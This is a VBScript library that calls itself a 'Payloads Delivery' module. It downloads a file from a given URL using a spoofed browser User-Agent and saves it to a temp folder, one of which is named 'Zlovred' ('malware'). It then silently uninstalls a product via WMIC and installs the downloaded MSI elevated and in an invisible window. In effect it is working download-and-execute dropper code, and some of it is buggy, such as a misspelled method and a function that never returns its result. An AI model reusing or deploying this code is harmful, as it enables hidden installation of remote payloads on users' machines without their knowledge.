' *********************************************************
'
' LIB_FUNC.VBS
' This file contain main modules for Payloads Delivery
'
' Revision 1.2.0.0 (Extended Beta) May be Present
' The Library Links at lib_func-1.0.0.js
' 
' Version 1.2.0.0 (Extended Beta)
'
' *********************************************************

' *********************************************************
' RegKeyRead001 Function
' This Function Read the Key RegistryKey and Returns
' a Key Value String
' *********************************************************
Function RegKeyRead001(registryKey)
	' Returns the value of a windows registry key.
	Dim winScriptShell
	'WScript.Echo registryKey

	On Error Resume Next
	Set winScriptShell = CreateObject("WScript.Shell")  ' access Windows scripting
	RegKeyRead001 = winScriptShell.RegRead(registryKey)    ' read key from registry
End Function

' *********************************************************
' RegKeyRead002 Function
' This Function Read the Key RegistryKey and Returns
' a Key Value String
' *********************************************************
Function RegKeyRead002(RootKey, KeyName, ValueName, RegType)
	' Returns the value of a windows registry key.
	Dim oCtx, oLocator, oWMI, oReg, oInParams, oOutParams
	Set oCtx = CreateObject("WbemScripting.SWbemNamedValueSet")
	oCtx.Add "__ProviderArchitecture", RegType
	Set oLocator = CreateObject("Wbemscripting.SWbemLocator")
	Set oWMI = oLocator.ConnectServer("", "root\default", "", "", , , , oCtx)
	Set oReg = oWMI.Get("StdRegProv")
	Set oInParams = oReg.Methods_("GetStringValue").Inparameters
	oInParams.Hdefkey = RootKey
  	oInParams.Ssubkeyname = KeyName
  	oInParams.Svaluename = ValueName

	Set oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, 0, oCtx)

	RegKeyRead002 = oOutParams.SValue
End Function

' *********************************************************
'
' getTempEnviron01()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
Function getTempEnviron01()
	Dim fso, wsh, envProc, envSys
	Dim strZlFolder ' Zlovred Temprorary Folder
	' Define ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	' Define Process Environment Variable
	Set envProc = wsh.Environment("PROCESS")
	' Define System Environment Variable
	Set envSys = wsh.Environment
	' Define Zlovred Temprorary Folder
	strZlFolder = "C:\pub1\Distrib\Zlovred"
	' Define and Check Environment Variables
	Dim envVariable
	envVariable = strZlFolder
	If Not fso.FolderExists(envVariable) Then
		envVariable = envProc("TEMP")
		If Not fso.FolderExists(envVariable) Then
			envVariable = envSys("TMP")
			IF Not fso.FolderExists(envVariable) Then
				envVariable = ""
			End If
		End If
	End If
	getTempEnviron01 = envVariable
End Function

' *********************************************************
'
' getDownlEnviron01()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Download Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
Function getDownlEnviron01()
	Dim fso, wsh, envProc, envSys, pathTemp
	Dim strZlFolder ' Download Temprorary Folder
	' Downloads Folder Registry Key
	Dim GUID_WIN_DOWNLOADS_FOLDER
	Dim KEY_PATH
	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
	KEY_PATH = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
	Dim aKey 
	aKey = KEY_PATH & GUID_WIN_DOWNLOADS_FOLDER
	'
	' Define ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	' Define Process Environment Variable
	Set envProc = wsh.Environment("PROCESS")
	' Define System Environment Variable
	Set envSys = wsh.Environment
	' Define Download Temprorary Folder

	On Error Resume Next
	pathTemp = RegKeyRead001(aKey)
	On Error Goto 0

	' WScript.Echo pathTemp
	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
	End If

	' Define and Check Environment Variables
	Dim envVariable
	envVariable = pathTemp
	If Not fso.FolderExists(envVariable) Then
		envVariable = envProc("TEMP")
		If Not fso.FolderExists(envVariable) Then
			envVariable = envSys("TMP")
			IF Not fso.FolderExists(envVariable) Then
				envVariable = ""
			End If
		End If
	End If
	getDownlEnviron01 = envVariable
End Function

' *********************************************************
'
' getDownlEnviron02()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Download Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
Function getDownlEnviron02()
	Const HKCR = &H80000000 'HKEY_CLASSES_ROOT
	Const HKCU = &H80000001 'HKEY_CURRENT_USER
	Const HKLM = &H80000002 'HKEY_LOCAL_MACHINE
	Const HKUS = &H80000003 'HKEY_USERS
	Const HKCC = &H80000005 'HKEY_CURRENT_CONFIG
	Dim fso, wsh, envProc, envSys, pathTemp
	Dim strZlFolder ' Download Temprorary Folder
	' Downloads Folder Registry Key
	Dim GUID_WIN_DOWNLOADS_FOLDER
	Dim KEY_PATH
	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
	KEY_PATH1 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
	'
	' Define ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	' Define Process Environment Variable
	Set envProc = wsh.Environment("PROCESS")
	' Define System Environment Variable
	Set envSys = wsh.Environment
	' Define Download Temprorary Folder
	pathTemp = RegKeyRead002(HKCU, KEY_PATH1, GUID_WIN_DOWNLOADS_FOLDER, 32)

	' WScript.Echo pathTemp
	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
	End If

	' Define and Check Environment Variables
	Dim envVariable
	envVariable = pathTemp
	If Not fso.FolderExists(envVariable) Then
		envVariable = envProc("TEMP")
		If Not fso.FolderExists(envVariable) Then
			envVariable = envSys("TMP")
			IF Not fso.FolderExists(envVariable) Then
				envVariable = ""
			End If
		End If
	End If
	getDownlEnviron02 = envVariable
End Function

' *********************************************************
'
' UploadFilesFromIntWithHTTP01( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- if XMLHTTP or ADOStream Can't Initialize
'				3 -- if Emty HTTP Responce or Send Access Denied
'				4 -- if HTTP Response Not 200 (while is not make)
'
' *********************************************************/
Function UploadFilesFromIntWithHTTP01(strFile, strURL, strPath)
	' body...
	On Error Resume Next
	Err.Clear
	Dim fso, xmlHttp, adoStream
	Dim cb0, cb1, cb2, cb3
	' Define FileSystemObject
	Set fso = CreateObject("Scripting.FileSystemObject")
	If Err.Number <> 0 Then
		UploadFilesFromIntWithHTTP01 = 1
	Else
		Err.Clear
		' Define XMLHTTP Help Object
		' Set xmlHttp = getXmlHttp02
		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
		If IsNull(xmlHttp) Then
			UploadFilesFromIntWithHTTP01 = 2
		Else
			' Define Adodb.Stream Object
			Set adoStream = CreateObject("Adodb.Stream")
			if Err.Number <> 0 Then
				UploadFilesFromIntWithHTTP01 = 2
			else
				Err.Clear
				Dim strFileURL
				Dim strLocal_Path
				Dim intUploadFilesFromIntWithHTTP01
				Dim blnExistRemoteFile
				Dim cb(4)
				' Define Full Downloaded File URL
				strFileURL = strURL & strFile
				' Define Full Local Path to be Downloaded
				strLocal_Path = strPath & "\" & strFile
				intUploadFilesFromIntWithHTTP01 = 0
				' Check if Path is Exist
				if fso.FolderExists(strPath) Then
					intUploadFilesFromIntWithHTTP01 = 0
				else
					intUploadFilesFromIntWithHTTP01 = 1
				end if
				If fso.FileExist(strLocal_Path) Then
					fso.DeleteFile strLocal_Path, true
				End If
				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01

				' Downloaded File
				' Open URL (Get Requiest synchronous)
				Err.Clear
				xmlHttp.Open "GET", strFileURL, false
				If Err.Number <> 0 Then
					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
					UploadFilesFromIntWithHTTP01 = 3
				Else
					Err.Clear
					' Set User-Agent Header (for Safari Browser)
					' WScript.Echo "Test!"
					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
					' Define Function onreadystatechange
					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
					'if(xmlHttp.readyState === 4) {
					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
					'	cb[2] = xmlHttp.responseText; // Response Text
					'	cb[3] = xmlHttp.responseBody; // Response Body
					'}

					' Send File from URL

					xmlHttp.Send
					' /*** Test ***/
					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
						'xmlHttp.WaitForResponse
						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
						'UploadFilesFromIntWithHTTP01 = 3
						'xmlHttp.Abort
						Err.Clear
						
						cb0 = xmlHttp.Status
						cb1 = xmlHttp.getAllResponseHeaders
						cb2 = xmlHttp.responseText
						cb3 = xmlHttp.responseBody
						If cb0 = 200 And intUploadFilesFromIntWithHTTP01 = 0 Then
							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
							' If Send Request is Successful
							blnExistRemoteFile = true
						Else
							blnExistRemoteFile = false
							intUploadFilesFromIntWithHTTP01 = 4
							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
							xmlHttp.Abort
						End If
						If blnExistRemoteFile = true Then
							' Set AdoStream Type mode and Open It
							adoStream.Type = 1
							adoStream.Mode = 3
							adoStream.Open
							' Write to AdoStream Response Body of HTTP Request
							Err.Clear
							adoStream.Write(cb3)
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
							End If
							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
							' Save Stream to strFile
							Err.Clear ' Must be Heare!
							adoStream.SaveToFile strLocal_Path, 2
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
								intUploadFilesFromIntWithHTTP01 = 1
							Else
								' /Downloaded File
								' Close Objects
								adoStream.Close
								xmlHttp.Abort
								' Check If File Downloaded
								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromIntWithHTTP01 = 0 Then
									Wscript.Echo strLocal_Path & " is not found!"
									intUploadFilesFromIntWithHTTP01 = 1
								End If
							End If
						End If
				End If
				UploadFilesFromIntWithHTTP01 = intUploadFilesFromIntWithHTTP01
				' WScript.Echo strLocal_Path
			end if
		End If
	End If
End Function

' ******************************************************************************
'
' InstallDownloadedMSI01(strPath, strMSI, productName, intTimeOutW, intTimeOutM)
' This Function Run Hidden a strMSI File
' with Command "msiexec /i" & strPath\strMSI & "/quiet /qb /norestart /l*v' & strPath\strMSI.log
'
' PARAMETERS:   strPath -- The Path to strMSI
'               strMSI -- an MSI File to hidden Install
'               productName -- a Product Name of MSI Package for hidden Uninstall
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
'******************************************************************************/
Function InstallDownloadedMSI01(strPath, strMSI, productName, intTimeOutW, intTimeOutM)
	Dim constRun_MSI, constOpt, optLogFile
	Dim constRun_WMIC, constOptW
	' Define Log File
	optLogFile= " /l*v " & Chr(34) & strPath & "\" & strMSI & ".log" & Chr(34)
	' Define WMIC MSI Uninstall Options
	constRun_WMIC = " product where name=" & Chr(34)
	constOptW = Chr(34) & " call uninstall"
	' Define MSI Scripts Options
	constRun_MSI = " /i "
	' Define MSI Script Options (not Empty)
	constOpt = " /quiet /qb /norestart" & optLogFile
	Dim strValue, shApp, fso, wsh, envProc, pathCMD
	Dim strValueW, strWMIC
	' Define ActiveX Object
	Set shApp = CreateObject("Shell.Application")
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	Set envProc = wsh.Environment("PROCESS")
	pathCMD = envProc("SystemRoot") & "\System32"
	strWMIC = pathCMD & "\WBem\WMIC.exe"
	' Check Paths
	If Not fso.FileExists(strWMIC) Then
		InstallDownloadedMSI01 = 1
	Else
		If Not fso.FileExists(pathCMD & "\msiexec.exe") Then
			InstallDownloadedMSI01 = 1
		Else
			If Not fso.FileExists(strPath + "\" + strMSI) Then
				InstallDownloadedMSI01 = 1
			Else
				' Set WMIC Command Arguments
				strValueW = constRun_WMIC & productName & constOptW
				' Set msiexec Command Arguments
				strValue = constRun_MSI & Chr(34) & strPath & "\" & strMSI & Chr(34) & constOpt
				' Run WMIC.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
				shApp.ShellExecute strWMIC, strValueW, strPath, "runas", 0
				' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
				WScript.Sleep intTimeOutW
				' Run msiexec.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
				shApp.ShellExecute pathCMD & "\msiexec.exe", strValue, strPath, "runas", 0
				' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
				WScript.Sleep intTimeOutM
				InstallDownloadedMSI01 = 0
			End If
		End If
	End If
End Function

'* ********************************************************
'
' MSIDownlRun01( strURL, strMSI, productName, intTimeOutW, intTimeOutM)
'
' This Script Downloads MSI file from strURL Path and
' Install it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strMSI - Name of MSI File
'               productName -- a Product Name of MSI Package for hidden Uninstall
'				intTimeOut -- Estimated Time for Running (ms)
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
Function MSIDownlRun01( strURL, strMSI, productName, intTimeOutW, intTimeOutM)
	Dim iFlag
	Dim tempFolder
	' Get Temp Folder Name
	tempFolder = getTempEnviron01
	' Check if strFolder is Empty of TEMP Directory not Assigned
	If Len(tempFolder) = 0 Then
		ScriptDownlRun01 = 1
	Else
		iFlag = UploadFilesFromIntWithHTTP01(strMSI, strURL, tempFolder)
		If iFlag <> 0 Then
			ScriptDownlRun01 = 1
		Else
			InstallDownloadedMSI01 tempFolder, strMSI, productName, intTimeOutW, intTimeOutM
			ScriptDownlRun01 = 0
		End If
	End If
End Function



' WScript.Echo getTempEnviron01
'WScript.Echo getDownlEnviron01
'WScript.Echo getDownlEnviron02
'WScript.Echo "Error Code: " & UploadFilesFromIntWithHTTP01("iisstart.htm", "http://localhost/", "C:\Users\yuden")
'WScript.Echo "Error Code: " & UploadFilesFromIntWithHTTP01("index.html", "https://www.google.ru/", "C:\Users\yuden")
